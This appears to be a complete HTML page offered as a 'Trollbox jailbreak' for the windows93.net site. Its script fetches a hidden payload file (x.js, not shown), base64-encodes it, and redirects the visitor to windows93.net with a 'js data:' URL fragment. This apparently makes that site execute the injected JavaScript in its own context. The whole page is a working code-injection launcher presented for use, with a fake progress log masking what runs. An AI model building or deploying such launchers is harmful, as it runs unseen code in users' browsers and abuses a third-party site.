<title>TBJB</title>
<style>
body {
	display: grid;
	place-items: center;
	height: 100vh;
	margin: 0;
	font-family: Consolas, monospace;
	background-image: url(space.jpg);
	background-size: cover;
	color: #fff
}
div#c {
	width: 400px;
	height: 25vh;
	text-align: center
}

button {
	background-color: midnightblue;
	color: #fff;
	font-family: Consolas, monospace;
}

#log {
	width: 417px;
	height: 185px;
	resize: none;
	background-color: #000;
	color: #fff;
	font-family: Consolas, monospace;
	outline: none;
}

::-moz-selection, ::selection {
  background: transparent;
}
</style>
<div id="c">
	<h1>TBJB</h1>
	<i>The most effective Trollbox jailbreak</i><br>
	<br><br>
	<button id="start">Start</button><br>
	<textarea id="log" style="display:none" readonly></textarea>
</div>



<script>
	b = document.getElementById('start');
	l = document.getElementById('log');
	l.value = ''


	async function clicked() {
		b.remove()
		l.style.display = ''
		addProgress('Starting jailbreak...')
		addProgress('Downloading payload...')
		x = (await (await fetch('x.js')).text()).replaceAll('<!site>', location.href)
		location.href = `https://www.windows93.net/#!js%20data:application/javascript;base64,${btoa(x)}`
	}

	b.addEventListener('click',clicked);

	function addProgress(text) {
		l.value += `${text}\n`
	}

</script>
